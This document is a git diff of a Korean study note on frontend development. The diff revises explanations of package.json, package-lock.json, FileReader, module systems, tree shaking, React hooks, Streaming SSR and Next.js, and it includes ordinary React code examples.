@@ -1086,7 +1086,7 @@
 
 - 바이너리 코드
 
-  바이너리 코드는 컴퓨터(CPU)가 인식할 수 있는 0과 1로 구성된 이진코드 혹은 데이터
+  바이너리 코드는 컴퓨터(CPU)가 인식할 수 있는 0과 1로 구성된 이진코드 혹은 데이터, 0과 1로 이루어진 여러 비트가 모여서 만든 코드
 
 - 기계어
 
@@ -6391,93 +6391,73 @@ useEffect(() => {
 
 - package.json의 역할
 
-  현재 프로젝트에 관한 정보와 패키지 매니저를 통해 설치한 모듈들의 의존성을 관리하는 파일이다.
+  - 프로젝트 이름, 버전, 설명 등의 정보 제공
+
+  - 의존성 패키지 관리 (dependencies, devDependencies)
+
+  - npm 스크립트 정의 (scripts)
+
+  - 프로젝트에서 사용하는 모듈 버전 정의 및 관리
+
+- dependencies, devDependencies의 차이
+
+  개발용, 배포용 라이브러리를 구분하여 설치하기 위해 사용한다.
+
+  | 항목         | `dependencies`                         | `devDependencies`                                  |
+  | ------------ | -------------------------------------- | -------------------------------------------------- |
+  | 📦 포함 여부 | 배포 시 포함됨                         | 배포 시 **제외 가능** (`npm install --production`) |
+  | 🧠 용도      | 앱 **실행에 필요한** 라이브러리        | 앱 **개발/빌드/테스트에 필요한** 도구              |
+  | 🛠️ 설치 명령 | `npm install <패키지명>`               | `npm install -D <패키지명>`                        |
+  | 예시         | `react`, `axios`, `express`, `zustand` | `typescript`, `eslint`, `jest`, `webpack`, `vite`  |
+
+- package-lock.json
+
+  | 항목             | `package.json`                                                    | `package-lock.json`                                                                                                               |
+  | ---------------- | ----------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
+  | 🎯 목적          | 프로젝트 정보와 의존성 명세                                       | 의존성 **버전 고정** (정확한 트리 기록)                                                                                           |
+  | 📦 포함 내용     | 어떤 패키지를 쓰는지, **대략적인 버전 범위** (version range 사용) | 어떤 패키지가 설치됐는지, **정확한 버전** (의존성 트리 전체, 각 패키지의 정확한 버전, 다운로드 URL, 무결성 해시 등의 정보가 포함) |
+  | 🔁 업데이트 시점 | 직접 수정하거나 `npm install`로 의존성 추가 시                    | `npm install`로 패키지를 설치/제거할 때 자동 생성 또는 업데이트                                                                   |
+  | 👥 협업 시 의미  | "이런 패키지들을 쓸 거야"                                         | "정확히 이 버전들이 설치돼야 해"                                                                                                  |
+
+  설치된 의존성의 정확한 버전과 트리를 기록한 파일로 npm install 시 자동으로 생성 및 갱신되며, 협업과 배포에서 동일한 환경을 보장한다. Git 저장소에 꼭 커밋해서 팀원들이 동일한 패키지 버전을 설치하게 해야 한다.
 
 <br>
 
-- package.json에서 dependencies와 devDependencies의 차이
-
-  devDependencies의 개발용 라이브러리는 빌드 시 번들에 포함되지 않는다. 개발용과 배포용 라이브러리를 구분해서 설치해야 번들에 불필요한 라이브러리를 포함시키지 않아 빌드 시간 및 번들 사이즈를 줄일 수 있다.
-
-  (1) dependencies : 개발과 배포 시 모두 의존하는 패키지를 관리한다. 배포 후에도 포함되기 때문에 애플리케이션 동작과 연관된 모듈을 설치한다. 예를 들어 리액트 돔, 엑시오스, 전역 상태 관리 라이브러리, ui 라이브러리 등이 있다.
-
-  (2) devDependencies : 개발 시에만 의존하는 패키지를 관리한다. 배포 시 포함되지 않기 때문에 애플리케이션 동작과 직접적인 연관은 없지만, 개발할 때 필요한 라이브러리를 설치하면 된다. 예를 들어 웹팩, 바벨, 사스, 린트, 타입스크립트, 테스팅 라이브러리 등이 있다. 패키지 설치 시 ‘-D' 접미사를 붙여 설치할 수 있습니다.
-
-<br>
-
-- package-lock.json 이란?
-
-  (요약 : 의존성 패키지의 버전을 명시하고 있다. 협업 시 레파지토리에 필수적으로 함께 커밋해주어야한다. 해당 파일없이 인스톨하는 경우 다른 버전이 설치될 수 있기 때문에 협업하는 팀원들과의 패키지 버전을 맞추기 위해 사용한다.)
-
-  package-lock.json 파일은 npm을 사용해서 node_modules 트리나 package.json 파일을 수정하게 되면 자동으로 생성되는 파일이다.
-  이 파일은 파일이 생성되는 시점의 의존성 트리에 대한 정확한 정보를 가지고 있다. package.json 파일의 의존성 선언에는 version range가 사용됩니다. version range란 특정 버전이 아니라 버전의 범위를 의미한다. 가장 흔한 예로 npm install express를 실행하게 되면 package.json 파일에는 “^4.16.3”(Caret Ranges)로 버전 범위가 추가된다. 저 package.json 파일로 npm install을 실행하면 현재는 4.16.3 버전이 설치되지만 express의 새로운 minor, patch가 publish 되면 동일한 package.json 파일로 npm install을 실행해도 4.17.3, 이나 4.16.4 같은 업데이트된 버전이 설치된다. 물론 대부분의 경우에는 문제가 없지만 간혹 업데이트된 버전이 오류를 발생시키는 경우가 있다. package-lock.json 파일은 의존성 트리에 대한 정보를 가지고 있으며 package-lock.json 파일이 작성된 시점의 의존성 트리가 다시 생성될 수 있도록 보장한다. package-lock.json 파일은 npm에 의해서 프로젝트의 node_modules나 package.json이 수정되는 경우 생성되거나 업데이트되며 당시 의존성에 대한 정보를 모두 가지고 있다. 따라서 생성된 package-lock.json 파일은 소스 저장소에 커밋해야 한다.
-
-  (1) 의존성 트리에 대한 정보를 모두 가지고 있다.
-
-  (2) 저장소에 꼭 같이 커밋해야 한다. 반드시 커밋할 필요는 없지만 협업 시 저장소에 커밋하는 것이 좋다. 없는 경우 협업 시 pull 받은 대상자가 npm install로 패키지 설치 시 의존성 트리의 일부 버전이 간혹 다르게 설치되어 오류를 발생시킬 수 있다.
-
-  (3) node_modules 없이 배포하는 경우 반드시 필요하다.
-
-<br>
-
-### # **웹 태스크 매니저란?**
-
-<br>
-
-- 웹 태스크 매니저
-
-  개발 업무 시 코드 수정 후 브라우저에서 새로고침을 눌러야 변경된 내용을 볼 수 있으며, 배포 시 HTML, CSS, JS등의 파일을 압축하거나 변환해야 했는데 이러한 과정을 자동화해주는 도구를 웹 태스크 매니저라고 한다. 예를 들어 Grunt(그런트), Gulp(걸프) 등이 있는 것으로 알고 있다. 하지만 그런트와 걸프 같은 경우 웹팩으로 대체하여 사용하는데 완벽히 대체한다기 보다는 웹팩은 모듈 번들러이고 그런트와 걸프는 태스크 러너로 서로 다르지만 웹팩에 그런트와 걸프의 기능이 포함되어 있고 더 많은 기능(Browserify와 같은 의존성 관리 기능)이 포함되어 있기 때문에 웹팩으로 대체하여 사용하는 것으로 알고 있다.
-
-<br>
-
-### # 안티 패턴 알고 있는 것?
-
-<br>
-
-(1) 삼항연산자 : 렌더단에서는 삼항연산자를 사용
-
-(2) map의 key : map 메서드 사용 시 key 값으로 index 사용
-
-(3) 다중 컴포넌트 : 컴포넌트 두 개를 한 파일에 선언
-
-<br>
-
-### # **FileReader와 URL.createObjectURL**
+### # FileReader와 URL.createObjectURL
 
 이미지 미리보기와 같이 파일 입출력 관련 기능을 구현할 때 사용하는 대표적인 메소드로는 FileReader와 URL.createObjectURL 방식이 있다.
 
-<br>
-
 - Blob 객체와 File 객체
 
-  Blob 객체(바이너리 라지 오브젝트)는 이미지, 오디오, 영상 등을 다룰 때 사용하는 멀티미디어 객체이다. 사이즈나 타입 등의 정보를 담고 있다. File 객체도 Blob 객체와 유사하다. Blob을 상속받는 객체로 라스트모디파이드(최종수정날짜), 네임 등 조금 더 많은 정보를 담고 있다.
+  - Blob 객체(바이너리 라지 오브젝트) : 이미지, 오디오, 영상 등을 다룰 때 사용하는 멀티미디어 객체이다. 사이즈나 타입 등의 정보를 담고 있다.
+
+  - File 객체 : Blob을 상속받는 객체로 최종수정날짜(라스트모디파이드), 파일명(네임) 등의 조금 더 많은 정보를 담고 있다.
 
 - FileReader
 
-  FileReader 객체는 File객체나 Blob객체에 저장된 바이너리 데이터를 비동기적으로 읽어들이는 객체이다.
+  - File 객체, Blob 객체 저장된 바이너리 데이터를 비동기적으로 읽어 base64 인코딩된 문자열(data URL) 또는 텍스트 등으로 변환
 
-<br>
+  - 변환된 base64 문자열을 `<img src="data:...">` 등에 바로 사용할 수 있음
 
 - URL.createObjectURL
 
-  File객체나 Blob객체를 인자로 받아 임시 URL을 생성하여 사용한다. 해당 URL은 생성된 페이지 내에서만 유효하다.
-  URL.createObjectURL 사용 시 주의할 점은 문서가 닫히거나(페이지 이동) URL.revokeObjectURL 를 호출하지 않으면 생성한 고유 URL은 메모리에 계속 상주하게 된다. 즉 메모리 누수가 발생할 수 있다. 그러므로 사용하지 않을 때에는 URL.revokeObjectURL를 통해 생성한 객체 URL을 제거해주어야한다.
+  - File 객체, Blob 객체를 받아서 임시로 접근 가능한 고유한 URL을 바로 생성(별도의 인코딩 과정 없이, 브라우저 메모리에 포인터만 생성하는 방식), 해당 URL은 생성된 페이지 내에서만 유효하다.
 
-<br>
+  - 페이지를 닫거나 이동할 때 반드시 URL.revokeObjectURL()을 호출해야한다. 호출하지 않으면 생성한 고유 URL은 메모리에 계속 상주하게 되어 메모리 누수가 발생할 수 있다.
 
 - FileReader vs URL.createObjectURL
 
-  (1) 메모리 사용량 : FileReader는 base64 인코딩 string을 사용하고 URL.createObjectURL는 포인터를 사용하기 때문에 FileReader의 메모리 사용량이 더 크다.
-
-  (2) 속도 및 편의성 : FileReader는 파일이나 blob을 읽고 base64 인코딩 string으로 변환하는데 많은 작업이 필요하고 URL.createObjectURL은 읽기 과정 없이 고유한 URL을 즉시 생성하므로 속도가 더 빠르다.
-
-  (3) 수용 가능 용량 : FileReader는 10mb, URL.createObjectURL는 800md 정도 용량까지 수용한다.
-
-<br>
-
-### # **import 중괄호 {}의 유무**
+  | 항목          | FileReader                        | URL.createObjectURL                  |
+  | ------------- | --------------------------------- | ------------------------------------ |
+  | 결과물        | base64 인코딩된 문자열 (data URL) | 임시 고유 URL                        |
+  | 메모리 사용량 | 상대적으로 높음                   | 상대적으로 낮음                      |
+  | 속도          | 느림 (파일 읽고 인코딩 필요)      | 빠름 (즉시 URL 생성)                 |
+  | 용량 한계     | 10MB 정도 권장                    | 800MB 이상도 가능                    |
+  | 사용 후 처리  | 불필요                            | 필요, `URL.revokeObjectURL()`로 해제 |
 
 <br>
+
+### # import 중괄호 {}의 유무
 
 - export 방식에서 차이가 있다. export로 내보낸 경우 이름을 그대로 활용하여 {} 중괄호로 감싸 가져와야하고 export default로 내보낸 경우 이름을 변경하여 괄호 없이 가져올 수 있다. 이 때 중괄호가 있는 경우도 as 키워드를 이용하면 이름을 바꿔 받아올 수 있다. {a as b}의 경우 a의 값을 b에 할당하여 가져온다라고 해석할 수 있다.
 
@@ -6502,7 +6482,9 @@ useEffect(() => {
 
 - 모듈 시스템이 생겨난 이유
 
-  모듈 시스템이 생기기 전 Javascript는 기본적으로 script 태그로 불려져 사용했었다. 하지만 하나의 javascript 파일에 작성되는 경우 가독성 및 유지보수성이 매우 떨어지고, javascript 파일을 분리하여 script 태그로 불려진 여러 javascript는 서로 관계가 없음에도 전역 객체 간에 의존성(전역 변수 공유)을 가지거나 스크립트 파일 로드 순서 등 여러 문제가 발생했다. 그래서 생겨난 것이 모듈 시스템이다. 모듈 시스템의 대표적인 포맷(문법)으로는 ESM(ECMAScript Modules)과 CJS(CommonJS)가 있다.
+  모듈 시스템이 생기기 전 Javascript는 기본적으로 script 태그로 불려져 사용했었다. 하지만 하나의 javascript 파일에 작성되는 경우 가독성 및 유지보수성이 매우 떨어지고,
+  javascript 파일을 분리하여 script 태그로 불려진 여러 javascript는 서로 관계가 없음에도 전역 객체 간에 의존성(전역 변수 공유)을 가지거나 스크립트 파일 로드 순서를
+  수동으로 지정해야하는 등 여러 문제가 발생했다. 그래서 생겨난 것이 모듈 시스템이다. 모듈 시스템의 대표적인 포맷(문법)으로는 ESM(ECMAScript Modules)과 CJS(CommonJS)가 있다.
 
 - ESM(ECMAScript Modules)과 CJS(CommonJS) 차이
 
@@ -6534,7 +6516,7 @@ useEffect(() => {
 
   1. 동적 require
 
-  아무 위치에서나 불러올 수 있고 런타임에 동적으로 불러오기 떄문에 어떤 모듈을 불러오는지 정적으로 파악할 수 없음
+  아무 위치에서나 불러올 수 있고 require() 호출과 module.exports 객체 할당이 런타임에 실행되기 때문에, 어떤 부분이 실제로 사용되는지 정적으로 파악하기 어렵다.
 
   ```javascript
   const lib = require(condition ? "a" : "b");
@@ -6542,13 +6524,21 @@ useEffect(() => {
 
   2. exports가 객체 단위
 
-  exports 시 객체 단위로 내보내기 때문에 번들러가 어떤 함수가 쓰이는지 알기 어려움 (구조 분해가 아님)
+  exports 시 객체 단위로 내보내기 때문에 번들러가 어떤 함수가 쓰이는지 알기 어려움 (구조 분해가 아님), 런타임에 동적으로 export 객체에 프로퍼티를 추가할 수 있기 때문에 정적으로 파악하기 어렵다.
 
   ```javascript
+  // 객체 단위 export
   module.exports = {
     a: () => {},
     b: () => {},
   };
+
+  // 런타임에 동적으로 export
+  exports.add = (a, b) => a + b;
+
+  if (someCondition) {
+    exports.mul = (a, b) => a * b;
+  }
   ```
 
 <br>
@@ -6557,7 +6547,12 @@ useEffect(() => {
 
 - 트리쉐이킹
 
-  웹팩에서도 찾아볼 수 있고 네이밍에서도 알 수 있듯이 나무를 흔들어 필요없는 나뭇잎들을 떨어뜨린다는 뜻이다. 트리쉐이킹은 번들링 시 패키지 내부의 필요한 코드만 가져오고 필요없는 코드를 제거하여 최적화하는 기법을 말한다. 번들 사이즈 및 빌드 시간을 줄일 수 있다. 웹팩은 ES6 이상의 import, export 표준 모듈 시스템을 사용하는 모듈에 대해 기본적인 트리쉐이킹을 지원한다. import 하는 패키지 내부에 사용하지 않는 export를 제거하는 것이다. 주의할 점은 ES5 이하 CommonJS 모듈 시스템을 사용하는 경우 트리쉐이킹이 적용되지 않는다. 이렇게 동작하는 이유는 ESM은 컴파일 타임에 모듈을 로딩하기 때문에 트리쉐이킹이 가능하고 CJS는 런타임에 모듈을 로딩하기 때문에 트리쉐이킹이 불가능하다. 또한 바벨의 babel-preset-env 사용 시 import가 require로 변환될 수 있기 때문에 트리쉐이킹이 적용되지 않을 수 있다. 이 때 bable preset env 속성 중 modules 속성을 false로 설정하여 문제를 해결할 수 있다.
+  웹팩에서도 찾아볼 수 있고 네이밍에서도 알 수 있듯이 나무를 흔들어 필요없는 나뭇잎들을 떨어뜨린다는 뜻이다. 트리쉐이킹은 번들링 시 패키지 내부의 필요한 코드만 가져오고 필요없는 코드를
+  제거하여 최적화하는 기법을 말한다. 번들 사이즈 및 빌드 시간을 줄일 수 있다. 웹팩은 ES6 이상의 import, export 표준 모듈 시스템을 사용하는 모듈에 대해 기본적인 트리쉐이킹을 지원한다.
+  import 하는 패키지 내부에 사용하지 않는 export를 제거하는 것이다. 주의할 점은 ES5 이하 CommonJS 모듈 시스템을 사용하는 경우 트리쉐이킹이 적용되지 않는다. 이렇게 동작하는 이유는
+  ESM은 컴파일 타임에 모듈을 로딩하기 때문에 트리쉐이킹이 가능하고 CJS는 런타임에 모듈을 로딩하기 때문에 트리쉐이킹이 불가능하다. 또한 바벨의 @babel/preset-env 사용 시 import가
+  require로 변환될 수 있기 때문에 트리쉐이킹이 적용되지 않을 수 있다. 이 때 @babel/preset-env 속성 중 modules 속성을 false로 설정하면 ES 모듈을 CJS 모듈로 변환하지 않으므로
+  문제를 해결할 수 있다.
 
 - react의 컴파일 타임
 
@@ -6818,52 +6813,102 @@ export default Login;
 
 <br>
 
-### # **useTransition / useDeferredValue**
+### # useRef
 
-react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었다. 이 두가지 hook은 기존 debouncing과 throttling이 필요한 경우 사용할 수 있다.
+- React에서 특정 값을 컴포넌트 생애주기 동안 계속 저장하고 싶을 때 쓰는 훅이다. 값을 저장할 뿐만 아니라, DOM 엘리먼트에 직접 접근할 때도 주로 사용한다. current 값 변경 시 리렌더링이 발생하지 않고 다른 state로 인해 리렌더링이 발생하여도 값을 유지한다.
 
-<br>
+  ```jsx
+  // 값 저장용
+  import React, { useRef } from "react";
 
-- useTransition
+  function Timer() {
+    const countRef = useRef(0);
 
-  useTransition는 state의 업데이트를 늦춰준다. 일반 setState는 긴급 업데이트로 처리되고 useTransition의 startTransition로 래핑한 setState는 일반 setState보다 느리게 동작한다. 즉 비동기로 동작하며 배치업데이트 되던 setState의 우선 순위를 지정할 수 있다. 사용법은 useTransition가 반환하는 첫번째 객체로 state 업데이트가 진행 중임을 감지할 수 있고 두번째 객체로 업데이트를 늦출 state를 래핑할 수 있다. 예시로 사용자 입력에 따른 값이 큰 setState의 연산이 있는 경우 입력할 때마다 딜레이가 발생할 수 있는데 해당 setState 연산을 useTransition로 래핑하여 사용자 입력이 딜레이되지 않도록 하고 연산 시 isPending을 통해 로딩 UI를 노출해주며 사용자 경험을 향상시킬 수 있다.
+    function handleClick() {
+      countRef.current += 1; // 변경해도 리렌더링 발생 x
+      console.log(countRef.current); // 값은 유지됨
+    }
 
-  ```javascript
-  function App() {
-    const [isPending, startTransition] = useTransition();
-    const [firstCount, setFirstCount] = useState(1);
+    return <button onClick={handleClick}>Click me</button>;
+  }
+  ```
 
-    const handleClick = () => {
-      startTransition(() => {
-        setSecondCount((prev) => prev + 10);
-      });
+  ```jsx
+  // DOM 접근용
+  import React, { useRef } from "react";
 
-      setFirstCount((prev) => prev + 1);
-    };
+  function InputFocus() {
+    const inputRef = useRef(null);
+
+    function focusInput() {
+      inputRef.current.focus(); // 실제 DOM input에 포커스
+    }
 
     return (
-      <div>
-        {isPending ? (
-          <div>로딩...</div>
-        ) : (
-          arr2.map((el, index) => {
-            return (
-              <button key={index} onClick={handleClick}>
-                {secontCount}
-              </button>
-            );
-          })
-        )}
-      </div>
+      <>
+        <input ref={inputRef} />
+        <button onClick={focusInput}>Focus Input</button>
+      </>
     );
   }
   ```
 
 <br>
 
+### # useTransition / useDeferredValue
+
+react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었다. 이 두 가지 hook은 기존 debouncing과 throttling이 필요한 경우 사용할 수 있다.
+
+<br>
+
+- useTransition
+
+  useTransition는 state의 업데이트를 늦춰준다. 일반 setState는 긴급 업데이트로 처리되고 useTransition의 startTransition로 래핑한 setState는 일반 setState보다
+  느리게 동작한다. 즉 비동기로 동작하며 배치업데이트 되던 setState의 우선 순위를 지정할 수 있다. 사용법은 useTransition가 반환하는 첫번째 객체로 state 업데이트가 진행 중임을
+  감지할 수 있고 두번째 객체로 업데이트를 늦출 state를 래핑할 수 있다. 예시로 사용자 입력에 따른 값이 큰 setState의 연산이 있는 경우 입력할 때마다 딜레이가 발생할 수 있는데
+  해당 setState 연산을 useTransition로 래핑하여 사용자 입력이 딜레이 되지 않도록 하고 연산 시 isPending을 통해 로딩 UI를 노출해주며 사용자 경험을 향상시킬 수 있다.
+
+  ```javascript
+  import { useState, useTransition } from "react";
+
+  const App = () => {
+    const [input, setInput] = useState("");
+    const [list, setList] = useState([]);
+    const [isPending, startTransition] = useTransition();
+    const bigList = [...Array(10000).keys()];
+
+    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+      const value = e.target.value;
+      setInput(value); // ✅ 긴급 업데이트: 사용자 입력 즉시 반영
+
+      // 🕗 느린 업데이트: 무거운 작업은 나중에 천천히
+      startTransition(() => {
+        const filtered = bigList.filter((item) =>
+          item.toString().includes(value)
+        );
+        setList(filtered);
+      });
+    };
+
+    return (
+      <div>
+        <input value={input} onChange={handleChange} />
+        {isPending && <div>로딩 중...</div>}
+        <ul>
+          {list.map((item) => (
+            <li key={item}>{item}</li>
+          ))}
+        </ul>
+      </div>
+    );
+  };
+  ```
+
 - useDeferredValue
 
-  useTransition는 업데이트 순서에 직접 관여하는 반면 useDefferredValue는 업데이트 되는 값에 관여한다. useDefferredValue를 적용하는 경우 값이 완전히 처리되기 전까지 이전 값을 표시한다. 사용법은 setState의 업데이트 값인 state를 전달받아 사용한다. 예시로 검색어 입력 중 입력 값에 따른 결과물 노출 시 검색어 입력이 완료되기 전 원하지 않는 결과물이 노출되는 것을 막을 수 있다.
+  useTransition는 업데이트 순서에 직접 관여하는 반면 useDefferredValue는 업데이트 되는 값에 관여한다. useDefferredValue를 적용하는 경우 값이 완전히 처리되기 전까지
+  이전 값을 표시한다. 사용법은 setState의 업데이트 값인 state를 전달받아 사용한다. 예시로 검색어 입력 중 입력 값에 따른 결과물 노출 시 검색어 입력이 완료되기 전 원하지 않는
+  결과물이 노출되는 것을 막을 수 있다.
 
   ```javascript
   const UseDeferredValueTest = () => {
@@ -6879,17 +6924,46 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
 <br>
 
-### # **React 18 Streaming SSR**
+### # React 18 Streaming SSR
 
-<br>
+- Streaming SSR이란
 
-- 기존 SSR의 동작 방식은 브라우저가 서버에서 렌더링이 완료된 HTML 파일(static)을 받아온 뒤 이 HTML 파일을 파싱한 후 사용자에게 우선적으로 보여준다. 그 후 javascript가 로드되면 하이드레이션을 통해 사용자와 상호작용 가능하도록 한다. 이 때 서버에서 렌더링이 지연될 경우 TTFB가 늦어지고 이어서 FCP도 느려질 수 있다. 또한 javascript 로드가 지연되는 경우 하이드레이션이 지연되어 TTI(사용자와 상호작용 시간)가 느려져 사용자 경험이 좋지 않아질 수도 있다. 이러한 상황을 개선하고자 React 18에서는 Streaming SSR가 추가되었다. Streaming SSR이란 Suspense 컴포넌트를 기준으로 서버에서 HTML을 여러 청크로 나눠 렌더링 하고, 렌더링이 완료된 부분 먼저 스트리밍 형태로 클라이언트에 응답하고 하이드레이션 또한 우선적으로 처리한다. 이러한 방식을 통해 TTFB, FCP, TTI를 개선하였다.
+  기존 SSR의 동작 방식은 브라우저가 서버에서 렌더링이 완료된 HTML 파일(static)을 받아온 뒤 이 HTML 파일을 파싱한 후 사용자에게 우선적으로 보여준다. 그 후 javascript가 로드되면
+  하이드레이션을 통해 사용자와 상호작용 가능하도록 한다. 이 때 서버에서 렌더링이 지연될 경우 TTFB가 늦어지고 이어서 FCP도 느려질 수 있다.
 
-  - TTFB(Time to first byte) : 브라우저가 HTTP 요청 후 첫 번째 응답 byte를 받는 시간
+  또한 javascript 로드가 지연되는 경우 하이드레이션이 지연되어 TTI(사용자와 상호작용 시간)가 느려져 사용자 경험이 좋지 않아질 수도 있다. 이러한 상황을 개선하고자 React 18에서는 Streaming SSR가 추가되었다.
 
-  - FCP(First Contentful Paint) : 첫 번째 의미있는 컨텐츠가 렌더링되는 시간
+  `<Suspense>` 컴포넌트를 기준으로 서버에서 HTML을 청크(chunk) 단위로 나누고, 렌더링이 완료된 HTML 청크부터 스트리밍 형태로 브라우저에 전송한다. 클라이언트는 서버에서 도착하는
+  HTML 청크를 순차적으로 그려나가며, 동시에 하이드레이션도 스트리밍처럼 병렬로 처리하여 전체 페이지가 준비되기 전이라도 사용자는 빠르게 일부 콘텐츠를 볼 수 있다.
 
-  - TTI(Time to Interation) : 컨텐츠가 렌더링된 후 js 로드가 되고 하이드레이션하여 사용자와 상호작용하는 시간
+  이러한 방식을 통해 TTFB, FCP, TTI를 개선하였다.
+
+- Streaming SSR 구현 방법
+
+  - react.js
+
+    - `renderToPipeableStream()`(혹은 `renderToReadableStream()`) API + `<Suspense>`를 함께 사용해서 구현
+
+  - next.js
+
+    - Next.js 13 이상에서 app/ 디렉토리 기반의 서버 컴포넌트 + `<Suspense>` 사용만 해도 자동으로 스트리밍
+
+      ```jsx
+      // app/page.tsx
+      import { Suspense } from "react";
+      import SlowComponent from "./SlowComponent";
+
+      export default function Page() {
+        return (
+          <>
+            <h1>Hello</h1>
+            <Suspense fallback={<p>로딩 중...</p>}>
+              <SlowComponent />
+            </Suspense>
+          </>
+        );
+      }
+      ```
 
 <br>
 
@@ -7014,55 +7088,6 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
 <br>
 
-- 미래의 리액트 컴포넌트
-
-  서버 컴포넌트가 도입됨으로써 백엔드 데이터 직접 접근, 번들 사이즈 감소, 자동 Code Splitting이 가능하게 되었고, 이로 인해 미래의 리액트 애플리케이션은 각 컴포넌트의 역할에 집중하여 개발할 수 있으며 애플리케이션의 퍼포먼스 또한 향상될 수 있을 것이다.
-
-  ```jsx
-  // Note.server.jsx
-  import { format } from "date-fns"; // 번들사이즈에 영향 없음
-  import { readFile } from "react-fs"; // 번들사이즈에 영향 없음
-  import path from "path";
-
-  import NotePreview from "./NotePreview"; // 공유 컴포넌트
-  import EditButton from "./EditButton.client"; // 클라이언트 컴포넌트, 자동 코드 분할됨
-
-  export default function Note({ selectedId }) {
-    const note = readFile(path.resolve(`./notes/${selectedId}.md`), "utf8"); // 파일 시스템에서 data fetching
-
-    if (note === null) {
-      return (
-        <div className="note--empty-state">
-          <span className="note-text--empty-state">
-            노트를 찾을 수 없어요 🥺
-          </span>
-        </div>
-      );
-    }
-
-    // 노트가 존재하지 않을 시 아래의 코드는 클라이언트에 전달되지 않음
-    let { id, title, body, updated_at } = note; // serializable한 props 클라이언트 컴포넌트로 전달 가능
-    const updatedAt = new Date(updated_at);
-
-    return (
-      <div className="note">
-        <div className="note-header">
-          <h1 className="note-title">{title}</h1>
-          <div className="note-menu" role="menubar">
-            <small className="note-updated-at" role="status">
-              마지막 변경 시간 {format(updatedAt, "yyyy MMM d 'at' h:mm bb")}
-            </small>
-            <EditButton noteId={id}>수정</EditButton>
-          </div>
-        </div>
-        <NotePreview body={body} />
-      </div>
-    );
-  }
-  ```
-
-<br>
-
 - 서버 컴포넌트(RSC)와 서버 사이드 렌더링(SSR)의 차이
 
   (1) 브라우저로 번들 전달 여부 : 서버 컴포넌트 번들은 클라이언트로 전달되지 않는다. 하지만 서버 사이드 렌더링의 모든 컴포넌트의 코드는 자바스크립트 번들에 포함되어 클라이언트로 전송된다.
@@ -7072,28 +7097,6 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
   (3) 데이터 리패치 시 상태 유지 : 서버 컴포넌트는 브라우저에 HTML이 아닌 RSC 객체로 전달되기 때문에 클라이언트 상태를 유지하며 데이터를 리패치 할 수 있다. 하지만 SSR의 경우 HTML로 전달되기 때문에 데이터 리패치 시 HTML 전체를 리렌더링이 하며 클라이언트 상태를 유지할 수 없다.
 
   (4) 결론 : 서버 컴포넌트는 서버 사이드 렌더링 대체가 아닌 보완의 수단으로 사용할 수 있다. 서버 사이드 렌더링으로 초기 HTML 페이지를 빠르게 보여주고, 서버 컴포넌트로는 브라우저로 전송되는 자바스크립트 번들 사이즈를 감소시킬 수 있다.
-
-<br>
-
-### # React 실행 순서
-
-1. 함수 컴포넌트 호출
-2. 구현부 실행
-   - props 취득, hook 실행, 내부 변수 및 함수 생성
-   - 단, hook 에 등록해둔 상태값, 부수함수 효과 등은 별도 메모리에 저장되어 관리된다.
-3. return 실행
-   - 렌더링 시작
-4. 렌더 단계 (Render Phase)
-   - 가상DOM을 생성한다.
-5. 커밋 단계 (Commit Phase)
-   - 실제 DOM에 반영한다.
-6. useLayoutEffect
-   - 브라우저가 화면에 Paint 하기 전에, useLayoutEffect에 등록해둔 effect(부수효과함수)가 '동기'로 실행된다.
-   - 이 때, state, redux store 등의 변경이 있다면 한번 더 재렌더링 된다.
-7. Paint
-   - 브라우저가 실제 DOM을 화면에 그린다. didMount가 완료된다.
-8. useEffect
-   - Mount되어 화면이 그려진 직후, useEffect에 등록해둔 effect(부수효과함수)가 '비동기'로 실행된다.
 
 <br>
 
@@ -7358,6 +7361,30 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
     ![react_실행_순서_패니지먼트_04](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/edc8d826-f909-480e-b95a-5e26c6c3cbdd)
 
+    ```md
+    render Parent
+    render Child1
+    render Child2
+    render Child3
+    render Child4
+    useEffect 3 :
+    useEffect 2 :
+    useEffect 1 :
+    useEffect 4 :
+    useEffect parent :
+    render Parent
+    render Child1
+    render Child2
+    render Child3
+    render Child4
+    useEffect 3 : 테스트
+    useEffect 2 : 테스트
+    useEffect 1 : 테스트
+    useEffect 4 : 테스트
+    useEffect parent : 테스트
+    render Parent
+    ```
+
     위 코드는 RenderParent 컴포넌트 내부에 RenderChild1, RenderChild2, RenderChild3, RenderChild4를 자식 컴포넌트로 받아 렌더링하고 있다. 이 때 RenderChild1은 children props로 RenderChild2를 받고 있고 RenderChild2 또한 RenderChild3을 children props로 받고 있다. 이 때 콘솔 출력 결과는 위와 같다.
 
     1. 가장 상위 컴포넌트인 RenderParent 부터 시작해서 함수 몸체 부분의 콘솔이 찍힌다. 그리고 자식 컴포넌트들도 순차적으로 몸체 부분이 실행된다.
@@ -7371,17 +7398,49 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
 ### # **Next.js 사용 이유**
 
-<br>
+1. 다양한 렌더링 전략 지원
 
-1. 다양한 렌더링 전략 : CSR, SSR, SSG, ISR 등 다양한 렌더링 전략을 선택해서 사용할 수 있다.
+   - CSR (Client-Side Rendering): 클라이언트에서 렌더링.
 
-2. 프리 렌더링 : 기본적으로 모든 페이지를 프리 렌더한다. 프리 렌더를 통해 빌드 타임에 필요한 페이지들을 미리 생성한다. 또한 Link 컴포넌트 사용 시 해당 컴포넌트가 뷰포트에 포함되는 경우 프리 페치하여 클라이언트 사이드 라우팅 시 빠르게 페이지를 전환할 수 있다.
+   - SSR (Server-Side Rendering): 요청 시 서버에서 HTML 생성.
 
-3. 자동 코드스플리팅 : 페이지 디렉토리 내의 페이지들을 빌드 타임에 자동으로 코드스플리팅한다.
+   - SSG (Static Site Generation): 빌드 시 정적으로 HTML 생성.
 
-4. 디렉토리 기반 자동 라우팅 : 페이지 하위 디렉토리를 기반으로 자동 라우팅된다.
+   - ISR (Incremental Static Regeneration): 일부 페이지만 정적으로 생성하고, 필요할 때 다시 생성
 
-5. 이미지 최적화 : sqooush와 같은 이미지 최적화 모듈을 통해 자동으로 이미지를 최적화한다.
